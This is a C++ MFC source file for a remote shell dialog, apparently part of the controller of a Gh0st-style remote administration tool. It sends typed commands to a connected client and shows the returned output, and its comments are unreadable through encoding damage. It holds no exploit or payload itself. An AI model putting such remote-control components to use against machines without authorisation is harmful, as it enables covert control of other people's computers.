// ShellDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Remote.h"
#include "ShellDlg.h"
#include "afxdialogex.h"
#include "Common.h"

// CShellDlg �Ի���

IMPLEMENT_DYNAMIC(CShellDlg, CDialog)

CShellDlg::CShellDlg(CWnd* pParent /*=NULL*/,
	IOCPServer* IOCPServer, CONTEXT_OBJECT *ContextObject)
	: CDialog(IDD_DIALOG_SHELL, pParent)
{
	m_IocpServer = IOCPServer;
	m_ContextObject = ContextObject;

	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_SHELL));
}

CShellDlg::~CShellDlg()
{
}

VOID CShellDlg::OnReceiveComplete()
{
	if (m_ContextObject == NULL)
	{
		return;
	}
	AddKeyBoardData();
	m_nReceiveLength = m_Edit.GetWindowTextLength();
}

VOID CShellDlg::AddKeyBoardData()
{
	m_ContextObject->InDeCompressedBuffer.WriteBuffer((LPBYTE)"", 1);
	CString strResult = (char*)m_ContextObject->InDeCompressedBuffer.GetBuffer(0);

	//�滻
	strResult.Replace("\n", "\r\n");
	//���ԭʼ����
	int iLength = m_Edit.GetWindowTextLength();
	
	m_Edit.SetSel(iLength, iLength);
	//��ʾ
	m_Edit.ReplaceSel(strResult);
	m_nCursel = m_Edit.GetWindowTextLength();

}

void CShellDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT, m_Edit);
}


BEGIN_MESSAGE_MAP(CShellDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_CTLCOLOR()
END_MESSAGE_MAP()


// CShellDlg ��Ϣ�������


BOOL CShellDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��

	m_nCursel = 0;
	m_nReceiveLength = 0;
	SetIcon(m_hIcon,FALSE);
	CString str;
	sockaddr_in ClientAddr;
	memset(&ClientAddr, 0, sizeof(ClientAddr));

	int ClientAddrLength = sizeof(ClientAddr);

	BOOL bResult = getpeername(m_ContextObject->ClientSocket,
		(SOCKADDR*)&ClientAddr, &ClientAddrLength);

	str.Format("\\\\%s - Զ���ն�", bResult != INVALID_SOCKET ? inet_ntoa(ClientAddr.sin_addr) : "");

	SetWindowText(str);
	BYTE bToken = COMMAND_NEXT;
	m_IocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(BYTE));
	return TRUE;  // return TRUE unless you set the focus to a control
				  // �쳣: OCX ����ҳӦ���� FALSE
}


void CShellDlg::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	m_ContextObject->v1 = 0;
	CancelIo((HANDLE)m_ContextObject->ClientSocket);
	closesocket(m_ContextObject->ClientSocket);
	CDialog::OnClose();
}


BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: �ڴ����ר�ô����/����û���
	if (pMsg->message == WM_KEYDOWN)
	{
		// ����VK_ESCAPE��VK_DELETE
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
		{
			return TRUE;
		}
		//����ǿɱ༭��Ļس���
		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_Edit.m_hWnd)
		{
			int iLength = m_Edit.GetWindowTextLength();
			CString str;
			m_Edit.GetWindowText(str);
			str += "\r\n";
			m_IocpServer->OnClientPreSending(m_ContextObject, (LPBYTE)str.GetBuffer(0) + m_nCursel,
				str.GetLength() - m_nCursel);
			//���¶�λm_nCurSel
			m_nCursel = m_Edit.GetWindowTextLength();

		}
		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_Edit.m_hWnd)
		{
			if (m_Edit.GetWindowTextLength() <= m_nReceiveLength)
			{
				return TRUE;
			}
				
		}
	}

	return CDialog::PreTranslateMessage(pMsg);
}


HBRUSH CShellDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);

	// TODO:  �ڴ˸��� DC ���κ�����

	if (pWnd->GetDlgCtrlID() == IDC_EDIT && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(255, 255, 255);
		pDC->SetTextColor(clr);
		clr = RGB(0, 0, 0);
		pDC->SetBkColor(clr);
		return CreateSolidBrush(clr);
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}

	// TODO:  ���Ĭ�ϵĲ������軭�ʣ��򷵻���һ������
	return hbr;
}
